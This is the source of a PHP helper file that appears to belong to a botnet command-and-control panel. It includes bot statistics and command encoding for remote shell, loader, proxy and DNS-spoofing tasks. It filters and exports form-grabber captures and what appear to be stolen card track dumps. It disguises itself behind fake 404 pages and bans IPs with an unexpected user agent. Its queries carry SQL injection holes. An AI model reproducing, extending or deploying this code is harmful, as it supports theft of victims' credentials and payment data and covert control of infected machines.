<?php
if (!defined('N3N')) {
    header('HTTP/1.1 404 Not Found');
    header('Status: 404 Not Found');
    $nn = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' . PHP_EOL
        . '<html><head>' . PHP_EOL
        . '<title>404 Not Found</title>' . PHP_EOL
        . '</head><body>' . PHP_EOL
        . '<h1>Not Found</h1>' . PHP_EOL
        . '<p>The requested URL ' . htmlspecialchars($_SERVER['REQUEST_URI']) . ' was not found on this server.</p>' . PHP_EOL
        . '<p>Additionally, a 404 Not Found' . PHP_EOL
        . 'error was encountered while trying to use an ErrorDocument to handle the request.</p>' . PHP_EOL
        . '</body></html>';
    die($nn);
}

$adelim = "#";
function ShowFlag($countrycode, $altext = null)
{
    if ($countrycode == "ALL")
        return '<span class="glyphicon glyphicon-globe" title="All country" style="cursor: default;"></span></a>';
    if (strlen($countrycode) < 5)
        return '<img style="margin: 0px 0px 3px 0px;padding:0;border:0;" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS4wLWMwNjAgNjEuMTM0Nzc3LCAyMDEwLzAyLzEyLTE3OjMyOjAwICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NUM4NjA2NjM4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NUM4NjA2NjQ4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1Qzg2MDY2MTg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1Qzg2MDY2Mjg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" class="flag flag-' . strtolower($countrycode) . '" alt="' . $altext . '" title="' . $altext . '">';
    else
        return $countrycode;
}

function iError(mysqli $mysqli)
{
    ?>
    <link href="css/custom.css" rel="stylesheet" media="screen">
    <div class="panel panel-danger" style="width: 25%;margin: 0 auto;">
        <div class="panel-heading">
            <h3 class="panel-title">Error!</h3>
        </div>
        <div class="panel-body"> Connect Error
            - <?php echo $mysqli->connect_errno . '<br>' . $mysqli->connect_error ?></div>
    </div>
    <?php
    exit;
}

function ConnectMySQLi($host, $login, $password, $database)
{
    $mysqli = new mysqli($host, $login, $password, $database);
    if ($mysqli->connect_error)
        iError($mysqli);
    return $mysqli;
}

function MessageRedirect($link, $text = null)
{
    echo "<script>";
    if (!is_null($text))
        echo 'bootbox.alert("' . $text . '");';
    if (!is_null($link))
        echo "location=\"$link\";";
    echo "</script>";
}

function QueryRedirect(mysqli $mysqli, $command, $link)
{
    $mysqli->query($command);
    echo '<script>location="' . $link . '";</script>';
}

function WarningBox($text)
{
    ?>
    <div class="panel panel-danger" style="width: 25%;margin: 0 auto;">
        <div class="panel-heading">
            <h3 class="panel-title">Warning</h3>
        </div>
        <div class="panel-body">
            <?php echo $text; ?>
        </div>
    </div>
    <?php
}

function CmdParser($cmd)
{
    global $adelim;
    $cmd_str = explode($adelim, ($cmd));
    $echo_cmd = $cmd_str[1];
    return $echo_cmd;
}

function NotFound($text = null)
{
    $secret = null;
    if ($text != null) {
        $secret = "<!---" . base64_encode($text) . "--->";
    }

    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");
    $notfound =
        "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\r\n" .
        "<html><head>\r\n" .
        "<title>404 Not Found</title>\r\n" .
        "</head><body>\r\n" .
        "<h1>Not Found</h1>\r\n" .
        "<p>The requested URL " . htmlspecialchars($_SERVER['REQUEST_URI']) . " was not found on this server.</p>\r\n" .
        "<p>Additionally, a 404 Not Found \r\nerror was encountered while trying to use an ErrorDocument to handle the request.</p>\r\n" .
        "</body></html>" .
        $secret;
    die($notfound);
}

function CheckGuest($key)
{
    global $key_tologin;
    if (!isset($key_tologin)) {
        NotFound();
    }

    if (isset($_COOKIE['authkey']) || isset($_GET["authkey"])) {

        if (isset($_GET['authkey'])) {
            $authget = $_GET['authkey'];
            if ($authget != $key) {
                return false;
            } else {
                setcookie('authkey', $key);
                $_COOKIE['authkey'] = $key;
                return true;
            }
        } elseif (isset($_COOKIE['authkey'])) {
            $authkey = $_COOKIE['authkey'];
            if ($authkey != $key) {
                return false;
            } else {
                return true;
            }
        }
    }
    return false;
}

function CheckAllowed(mysqli $connect, $ip, &$reason)
{
    if ($_SERVER['REQUEST_METHOD'] != 'POST') {
        $reason = 'Wrong connect method';
        return true;
    }

    $ban_enabled = $connect->query('SELECT name FROM admin_config WHERE id = 1')->fetch_object()->name;
    if (!empty($ban_enabled)) {
        global $cookie, $useragent;

        $ip_banned = $connect->query("SELECT * FROM banned WHERE ip = '$ip' LIMIT 1")->fetch_row();
        if (!empty($ip_banned)) {
            $connect->close();
            NotFound();
        }
        if ($_SERVER['HTTP_USER_AGENT'] != $useragent) {
            $reason = 'Invalid user agent';
            return true;

        }
        $cookie_auth = isset($_COOKIE['auth']) ? $_COOKIE['auth'] : 0;
        if (!$cookie_auth) {
            $reason = 'Empty cookies';
            return true;
        }

        if ($cookie_auth != $cookie) {
            $reason = 'Invalid cookies';
            return true;
        }
    }
    return false;
}

function AddBan(mysqli $connect, $ip, $reason)
{
    if (!filter_var($ip, FILTER_VALIDATE_IP))
        return;

    $ban_enabled = $connect->query('SELECT name FROM admin_config WHERE id = 1')->fetch_object()->name;
    if (empty($ban_enabled)) {
        return;
    }

    $referer = array_key_exists('HTTP_REFERER', $_SERVER) ? $_SERVER['HTTP_REFERER'] : 'EMPTY';
    $useragent = array_key_exists('HTTP_USER_AGENT', $_SERVER) ? $_SERVER['HTTP_USER_AGENT'] : 'EMPTY';

    $ip_banned = $connect->query("SELECT * FROM banned WHERE ip = '$ip' LIMIT 1")->fetch_row();
    if (empty($ip_banned)) {
        $connect->query("REPLACE INTO banned (ip, useragent, ref, reason) VALUES ('$ip', '$useragent', '$referer', '$reason')");
    }
}

function compress($path, $out, $handle = false, $recursive = false)
{
    if (!is_dir($path) and !is_file($path))
        return false;

    if (!$handle) {
        $handle = new ZipArchive;
        if ($handle->open($out, ZipArchive::CREATE) === false) {
            return false;
        }
    }

    if (is_dir($path)) {
        $path = dirname($path . '/arch.ext');
        $handle->addEmptyDir($path);
        foreach (glob($path . '/*') as $url) {
            compress($url, $out, $handle, true);
        }

    } else {
        $handle->addFile($path);
    }

    if (!$recursive)
        $handle->close();

    return true;
}

function zip_sql($source, $destination, mysqli $mysqli, $db)
{
    if (!extension_loaded('zip') || !file_exists($source)) {
        return false;
    }

    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return false;
    }

    $source = str_replace('\\', '/', realpath($source));
    if (is_dir($source) == true) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($files as $file) {
            $file = str_replace('\\', '/', $file);
            if (in_array(substr($file, strrpos($file, '/') + 1), array('.', '..')))
                continue;

            $file = realpath($file);
            if (is_dir($file) == true) {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            } else if (is_file($file) == true) {

                $result = $mysqli->query("SELECT * FROM " . $db . "  WHERE file_hash='" . basename($file) . "'");
                if ($result != false && $result->num_rows > 0) {
                    $row = $result->fetch_assoc();
                    $filename = $row['file_hash'] . '_' . $row['file_path'];
                    $zip->addFromString(str_replace($source . '/', '', $filename), file_get_contents($file));
                }
            }
        }
    } else if (is_file($source) == true) {
        $zip->addFromString(basename($source), file_get_contents($source));
    }

    return $zip->close();
}

function compress_sql(mysqli $mysqli, $type, $path, $out, $handle = false, $recursive = false)
{
    /*
    if (!is_dir($path) and !is_file($path)) {
        echo $path;
        return false;
    }
*/
    if (!$handle) {
        $handle = new ZipArchive;
        if ($handle->open($out, ZipArchive::CREATE) == false) {
            return false;
        }
    }

    if (is_dir($path)) {
        $path = dirname($path . '/arch.ext');
        foreach (glob($path . '/*') as $url) {
            compress_sql($mysqli, $type, $url, $out, $handle, true);
        }

    } else {
        $name = basename($path);
        $file_name = $mysqli->query('SELECT file_path FROM "' . $type . '"  WHERE file_hash="' . $name . '"')->fetch_assoc();

        $handle->addFile($path, "[" . $name . "]_" . $file_name['file_path']);
    }

    if (!$recursive)
        $handle->close();

    return true;
}

function isFFEnabled(mysqli $mysqli)
{
    $ff_enabled = $mysqli->query("SELECT name FROM admin_config WHERE id = 2")->fetch_array();
    if ($ff_enabled[0] == "checked") {
        return true;
    }
    return false;
}

function ff_deny_host($host, $data)
{
    $hostnames = preg_split('/\n|,|\r\n?/', $host);
    $count = count($hostnames);

    $pattern = base64_decode($data);
    for ($i = 0; $i < $count; $i++) {
        $key = strstr($pattern, $hostnames[$i]);
        if ($key) {
            return true;
        }
    }
    return false;
}

function ff_state(mysqli $mysqli)
{
    $ff_enabled = $mysqli->query("SELECT name FROM admin_config WHERE id = 2")->fetch_array();
    if ($ff_enabled[0] == "checked") {
        return true;
    }
    return false;
}

function ff_nblacklisted(mysqli $mysqli, $data)
{
    $result = $mysqli->query("SELECT hostnames,block FROM formgrabber_host")->fetch_array();
    if ($result['hostnames'] != 'capture_all') {
        if (!ff_deny_host($result['hostnames'], $data)) {
            return false;
        }
    }
    if (ff_deny_host($result['block'], $data)) {
        return false;
    }
    return true;
}

function refresh_rate(mysqli $connect, $act, $rate)
{
    if ($act == 'set' && !is_null($rate)) {
        $refresh_id = time() . rand(111111, 999999);
        if ($rate > 0 && $rate < 999) {
            $connect->query("UPDATE botnet_config SET refresh_id='$refresh_id', refresh_rate = '$rate'");
        }
        MessageRedirect("?act=settings");
    } elseif ($act == 'get') {
        $refresh_rate = $connect->query('SELECT refresh_rate FROM botnet_config LIMIT 1')->fetch_row();
        return $refresh_rate[0];
    } elseif ($act == 'get_cc') {
        global $set_rate, $adelim;
        $refresh = $connect->query('SELECT * FROM botnet_config')->fetch_assoc();
        return $refresh['refresh_id'] . $adelim . $set_rate . " " . $refresh['refresh_rate'] . $adelim;
    }
    return 1;
}

function EncodeCommand($command)
{
    switch (strtolower($command)) {

        case "start proxy":
            return "PROXY";
            break;
        case "find file":
            return "FIND";
            break;
        case "cmd shell":
            return "CMD";
            break;
        case "cmd shell (with results)":
            return "CMD-Result";
            break;
        case "find process":
            return "FINDPROC";
            break;
        case "update":
            return "UPDATE";
            break;
        case "loader":
            return "LOADER";
            break;
        case "dns spoofing":
            return "DNS";
            break;
        case "plugin":
            return "PLUGIN";
            break;
    }
    return strtolower($command);
}

function GetSmallStat($bots_online, $bots_offline, $bots_hour, $bots_day, $bots_total, $bots_banned)
{
    echo '<div style="text-align:center; width:100%"><ul class="breadcrumb">'
        . ' Online bots :  <span class="badge">' . $bots_online . '</span>'
        . ' Offline bots : <span class="badge">' . $bots_offline . '</span>'
        . ' Hour bots : <span class="badge">' . $bots_hour . '</span>'
        . ' Today bots : <span class="badge">' . $bots_day . '</span>'
        . ' Total bots : <span class="badge">' . $bots_total . '</span>'
        . '<a href="?act=settings&do=blacklist"> Banned ip : <span class="badge badge-important"> ' . $bots_banned . ' </span></a>'
        . '</ul></div>';
}

function DeleteAll($dirname)
{
    $dir_handle = opendir($dirname);
    if ($dir_handle) {
        while (false !== ($file = readdir($dir_handle))) {
            $filename = $dirname . '/' . $file;
            if (file_exists($filename)) {
                if ($file != '.' && $file != '..' && $file != 'index.html' && $file != 'index.php' && $file != '.htaccess') {
                    unlink($filename);
                }
            }
        }
        closedir($dir_handle);
    }
}

function GetPagination($page, $str, $count_pages)
{
    if ($count_pages == 0)
        return;

    $pervpage = '';
    $page2left = '';
    $page1left = '';
    $page1right = '';
    $page2right = '';
    $nextpage = '';

    echo '<div style="text-align: center"> <ul class="pagination pagination-sm">';

    if ($page > 0) {
        $pervpage = '<li><a href= ./?' . $str . 'page=0><<</a></li><li><a href= ./?' . $str . 'page=' . ($page - 1) . '><</a></li>';
    }

    if ($page != $count_pages) {
        $nextpage = '<li><a href= ./?' . $str . 'page=' . ($page + 1) . '>></a></li>
                                   <li><a href= ./?' . $str . 'page=' . $count_pages . '>>></a></li>';
    }

    if ($page - 2 > 0) {
        $page2left = ' <li ><a href= ./?' . $str . 'page=' . ($page - 2) . '>' . ($page - 2) . '</a></li>  ';
    }

    if ($page - 1 > 0) {
        $page1left = ' <li ><a href= ./?' . $str . 'page=' . ($page - 1) . '>' . ($page - 1) . '</a></li> ';
    }

    if ($page + 2 <= $count_pages) {
        $page2right = '  <li><a href= ./?' . $str . 'page=' . ($page + 2) . '>' . ($page + 2) . '</a></li>';
    }

    if ($page + 1 <= $count_pages) {
        $page1right = '  <li ><a href= ./?' . $str . 'page=' . ($page + 1) . '>' . ($page + 1) . '</li></a>';
    }

    echo $pervpage . $page2left . $page1left . '<li class="active"><a>' . $page . '</a></li>' . $page1right . $page2right . $nextpage;
    echo '</ul></div>';
}

function my_substr($text, $len)
{
    if (strlen($text) > $len) {
        $string = substr($text, 0, $len);
        $string .= '...';
        return $string;
    }
    return $text;
}

function strs($string, $symbol)
{
    $buffer = stristr($string, $symbol);
    if ($buffer == false)
        return "";

    $pos = strpos($buffer, "\r\n");
    return substr($buffer, 0, $pos) . PHP_EOL;
}

function ExportFF(mysqli $mysqli, $filter)
{
    global $ff, $proto;
    $filename = 'upload/ff-export(' . date('Y-m-d_H-i-s') . ').txt';
    $f = fopen($filename, 'a');

    $page = 0;
    $per_write = 1000;

    $total_rows = $mysqli->query("SELECT * FROM botnet_ff")->num_rows;

    $num_out = ceil($total_rows / $per_write);
    for ($i = 1; $i <= $num_out; $i++) {
        $start = abs($page * $per_write);

        $res = $mysqli->query($filter . " LIMIT $start, $per_write");
        while ($row = $res->fetch_array()) {
            $buffer = str_replace('&', PHP_EOL, urldecode(base64_decode($row['bot_form'])));
            $ff_export =
                '====================================' . PHP_EOL
                . 'Machine id : ' . $row['bot_uid'] . PHP_EOL
                . 'Machine IP : ' . $row['bot_ip'] . PHP_EOL
                . 'Host : ' . base64_decode($row["bot_host"]) . PHP_EOL
                . 'Date : ' . $row["bot_date"] . PHP_EOL
                . 'Browser : ' . $row["bot_browser"] . PHP_EOL
                . 'Form : ' . PHP_EOL . $buffer . PHP_EOL;
            fwrite($f, $ff_export . PHP_EOL);
        }
        $page++;
    }
    fclose($f);

    $file_path = $proto . $_SERVER['SERVER_NAME'] . substr(str_replace('\\', '/', realpath(dirname(__FILE__))), strlen(str_replace('\\', '/', realpath($_SERVER['DOCUMENT_ROOT'])))) . '/';
    if (compress($filename, $filename . '.zip', false) != false) {
        $file_path .= $filename . '.zip';
        $file = iconv('utf-8', 'cp1251', $filename);
        @unlink($file);
    } else
        $file_path .= $filename;
    echo '<script>ReloadPage("Export succesfully!<br>File moved to - \'Upload\'<br><b>Direct link - <a href = \'' . $file_path . '\' title=\'Download\'>' . $file_path . '</a>", "' . $ff . '");</script>';
}

function ExportDumps(mysqli $mysqli)
{
    global $dumps, $proto;

    $filename = 'upload/cc-export(' . date('Y-m-d_H-i-s') . ').txt';
    $f = fopen($filename, 'a');

    $page = 0;
    $per_write = 1000;

    $total_rows = $mysqli->query("SELECT * FROM botnet_dumps")->num_rows;

    $num_out = ceil($total_rows / $per_write);
    for ($i = 1; $i <= $num_out; $i++) {
        $start = abs($page * $per_write);

        $res = $mysqli->query("SELECT * FROM botnet_dumps LIMIT $start, $per_write");
        while ($row = $res->fetch_array()) {
            $ff_export =
                'Machine id : ' . $row['bot_uid'] . PHP_EOL
                . 'Machine IP : ' . $row['bot_ip'] . PHP_EOL
                . 'Date/time : ' . $row["bot_date"] . PHP_EOL
                . 'Data : ' . base64_decode($row["track_data"]) . PHP_EOL
                . '====================================' . PHP_EOL;
            fwrite($f, $ff_export);
        }
        $page++;
    }
    fclose($f);

    $file_path = $proto .$_SERVER['SERVER_NAME'] . substr(str_replace('\\', '/', realpath(dirname(__FILE__))), strlen(str_replace('\\', '/', realpath($_SERVER['DOCUMENT_ROOT'])))) . '/';
    if (compress($filename, $filename . '.zip', false) != false) {
        $file_path .= $filename . '.zip';
        $file = iconv('utf-8', 'cp1251', $filename);
        @unlink($file);
    } else
        $file_path .= $filename;
    echo '<script>ReloadPage("Export succesfully!<br>File moved to - \'Upload\'<br><b>Direct link - <a href = \'' . $file_path . '\' title=\'Download\'>' . $file_path . '</a>", "' . $dumps . '");</script>';
}

function register(mysqli $mysqli, $login, $password, $type = 'user')
{
    $err = null;
    if (!preg_match("/^[a-zA-Z0-9]+$/", $login)) {
        $err .= "Username may only consist of letters of the alphabet and numbers.<br>";
    }

    if (strlen($login) < 3 or strlen($login) > 30) {
        $err .= "Username must be at least 3 characters and no more than 30.";
    }

    $query = $mysqli->query("SELECT uid FROM users WHERE username='" . $mysqli->real_escape_string($login) . "'")->num_rows;
    if ($query > 0) {
        $err .= "Members with such login already exist in the database.";
    }

    if (strlen($err) == 0) {
        $password_md5 = md5(md5($password));
        $mysqli->query("INSERT INTO users SET username='" . $login . "', password='" . $password_md5 . "', uid='" . $type . "'");
    } else {
        echo '<script type="text/javascript">bootbox.alert("<b>Add user error!</b><br>' . $err . '");</script>';
        return false;
    }
    return true;
}

function get_real_ip()
{
    $real_ip = null;
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    }

    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $real_ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $real_ip = array_pop(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']));
    } else {
        $real_ip = $_SERVER['REMOTE_ADDR'];
    }

    if (isset($_COOKIE['ip'])) {
        if (filter_var($_COOKIE['ip'], FILTER_VALIDATE_IP)) {
            $real_ip = $_COOKIE['ip'];
        }
    }
    return $real_ip;
}

function is_func_enabled($function)
{
    $disabled = explode(',', ini_get('disable_functions'));
    return !in_array($function, $disabled);
}

function mysql_v()
{
    $output = shell_exec('mysql -V');
    if (!$output) {
        return null;
    }
    preg_match('@[0-9]+\.[0-9]+\.[0-9]+@', $output, $version);
    return $version[0];
}

function check_mysql($current)
{
    $min_version = '5.6.1';
    if (abs($min_version) <= abs($current)) {
        return true;
    }
    return false;
}

function ParseFiles(mysqli $mysqli, $dir)
{
    global $page_limit;
    $sql = 'SELECT * FROM botnet_files';
    $search = isset($_GET['search']) ? $_GET['search'] : 0;
    if ($search) {
        $sql .= " WHERE file_path LIKE '%" . addslashes($search) . "%'";
    }

    $count = $mysqli->query($sql)->num_rows;
    $count_pages = intval($count / $page_limit);

    $page = isset($_GET['page']) ? intval($_GET['page']) : 0;
    if ($page) {
        $lim = intval($page * $page_limit);
        $sql .= " LIMIT $lim, $page_limit";
    } else {
        $sql .= " LIMIT 0, $page_limit";
    }

    $qstring = $_SERVER['QUERY_STRING'];
    $q_str = explode("&", $qstring);
    $str = "";

    foreach ($q_str as $s_str) {
        if (strstr($s_str, "page"))
            break;
        else
            $str .= htmlspecialchars($s_str) . "&";
    }

    if ($search) {
        echo '<i>Founded - ' . $count . ' item(s)...</i>';
    }

    $start = abs($page * $page_limit);
    $res = $mysqli->query($sql);
    if ($res) {
        if ($res->num_rows != 0) {
            echo '<table class="table table-responsive table-striped table-condensed table-hover">'
                . '<th style="text-align: center">#</th>'
                . '<th><b>IP</th>'
                . '<th><b>ID</th>'
                . '<th><b>Name</th>'
                . '<th><b>Size</th>'
                . '<th style="text-align: left;"><b>Date</th>'
                . '<th style="text-align: center;"><b>Action</th>'
                . '<tbody>';

            for ($i = 0; $i < $res->num_rows; $i++) {
                $row = $res->fetch_assoc();

                if ($row['file_size'] >= 1024) {
                    $fsstr = sprintf('%1.2f', $row['file_size'] / 1024) . ' KB';
                } else {
                    $fsstr = $row['file_size'] . ' B';
                }

                echo '<tr class="active">'
                    . '<td style="text-align: center"><b>' . $start . '</b></td>'
                    . '<td style="width=15%">' . $row["bot_ip"] . '</td>'
                    . '<td style="width=20%"><a href = "?act=ff&show_by_uid=' . $row['bot_uid'] . '"title="Search this bot on statistics page">' . $row['bot_uid'] . '</a></td>'
                    . '<td style="width=30%"><a href="download.php?file=' . $row['file_hash'] . '&dir=' . $dir . '&name=' . $row['file_path'] . '" title="Download file">' . $row['file_path'] . ' </a></td>'
                    . '<td style="width=10%">' . $fsstr . '</td>'
                    . '<td style="width=10%;  text-align: left;">' . $row['file_data'] . '</td>'
                    . '<td style="width=20%; text-align: center;"><a href="download.php?file=' . $row['file_hash'] . '&dir=' . $dir . '&name=' . $row['file_path'] . '" title="Download file"><span class="glyphicon glyphicon-save"></span></a>'
                    . '&nbsp;'
                    . '<a href="?act=logs&do=' . $dir . '&file_hash=' . $row['file_hash'] . '&form=delete" title="Delete"><span class="glyphicon glyphicon-trash"></span></a></td>'
                    . '</tr>';
                $start++;
            }
            echo '<tbody></table>';
            GetPagination($page, $str, $count_pages);
        }
    }
}

function ParseDb(mysqli $mysqli, $type)
{
    $sql = 'SELECT * FROM';
    switch ($type) {
        case 'plugin':
            $sql .= ' botnet_plugin';
            $dir = 'plugin';
            break;
        default:
            $sql .= ' botnet_logs';
            $dir = 'process';
            break;
    }

    $search = isset($_GET['search']) ? $_GET['search'] : 0;
    if ($search) {
        $sql .= " WHERE event_text LIKE '%" . addslashes($search) . "%'";
    }

    global $page_limit;
    $count = $mysqli->query($sql)->num_rows;
    $count_pages = intval($count / $page_limit);

    $page = isset($_GET['page']) ? intval($_GET['page']) : 0;
    if ($page) {
        $lim = intval($page * $page_limit);
        $sql .= " LIMIT $lim, $page_limit";
    } else {
        $sql .= " LIMIT 0, $page_limit";
    }

    $qstring = $_SERVER['QUERY_STRING'];
    $q_str = explode("&", $qstring);
    $str = "";

    foreach ($q_str as $s_str) {
        if (strstr($s_str, "page"))
            break;
        else
            $str .= htmlspecialchars($s_str) . "&";
    }

    if ($search) {
        echo '<i>Founded - ' . $count . ' item(s)...</i>';
    }

    $res = $mysqli->query($sql);
    $rows = $res->num_rows;
    if ($rows != 0) {
        echo '<table class="table table-responsive table-striped table-condensed table-hover">'
            . '<th style="text-align: center">#</th>'
            . '<th><b>IP</th>'
            . '<th><b>ID</th>'
            . '<th><b>Text</th>'
            . '<th style="text-align: left;"><b>Date</th>'
            . '<th style="text-align: center;"><b>Action</th>'
            . '<tbody>';

        for ($i = 0; $i < $rows; $i++) {
            $row = $res->fetch_assoc();

            echo '<tr><td style="width:1%"><b>' . $i . '</td>'
                . '<td style="width:5%"">' . $row["bot_ip"] . '</td>'
                . '<td style="width:5%"><a href = "?act=clients&status=total&countries=ALL&bot_uid=' . $row['bot_uid'] . '" title="Show in statistics">' . $row['bot_uid'] . '</td>'
                . '<td style="width:50%">'
                . '<div class="input-group">'
                . ' <span class="input-group-addon">' . $row["event_name"] . '</span>'
                . '<input readonly class="form-control" type="text" value="' . $row["event_text"] . '">'
                . '</div>'
                . '</td>'
                . '<td style="width:10%">' . $row['event_date_time'] . '</td>'
                . '<td style="width:5%;text-align:center"><a href="?act=logs&do=' . $dir . '&event_hash=' . $row['event_hash'] . '&form=delete" title="Delete"><span class="glyphicon glyphicon-trash"></span></a></td>';
        }
        echo '</tr></tbody></table>';
        GetPagination($page, $str, $count_pages);
    }
}

function task_action(mysqli $mysqli, $task_id, $action)
{
    $sql = null;
    global $tasks_url;

    switch ($action) {
        case 'start':
            $sql = 'UPDATE ' . DB_TASKS . ' SET status="1" WHERE task_id = "' . $task_id . '"';
            break;
        case 'stop':
            $sql = 'UPDATE ' . DB_TASKS . ' SET status="0" WHERE task_id = "' . $task_id . '"';
            break;
        case 'repeat':
            $check = $mysqli->query('SELECT * FROM ' . DB_TASKS . ' WHERE task_id = "' . $task_id . '"')->fetch_assoc();
            if ($check) {
                $task_id_new = time() . mt_rand(111111, 999999);
                $task_need_exec = isset($check['needexecs']) ? $check['needexecs'] : '0';
                $sql = 'UPDATE ' . DB_TASKS . ' SET task_id = "' . $task_id_new . '", execs = "0", needexecs = "' . $task_need_exec . '", failed = "0" WHERE task_id = "' . $task_id . '"';
            }
            break;
        case 'kill':
            $sql = 'DELETE FROM ' . DB_TASKS . ' WHERE task_id = "' . $task_id . '"';
            break;
        case 'start_all_tasks':
            $sql = 'UPDATE ' . DB_TASKS . ' SET status="1"';
            break;
        case 'stop_all_tasks':
            $sql = 'UPDATE ' . DB_TASKS . ' SET status="0"';
            break;
        case 'kill_all_tasks':
            $sql = 'truncate ' . DB_TASKS . '';
            break;
    }
    QueryRedirect($mysqli, $sql, $tasks_url);
}

function fast_count_sql(mysqli $mysqli, $sql)
{
    $sql_counter_str = str_replace('SELECT *', 'SELECT COUNT(*)', $sql);
    $sql_counter = $mysqli->query($sql_counter_str)->fetch_array();
    return $sql_counter[0];
}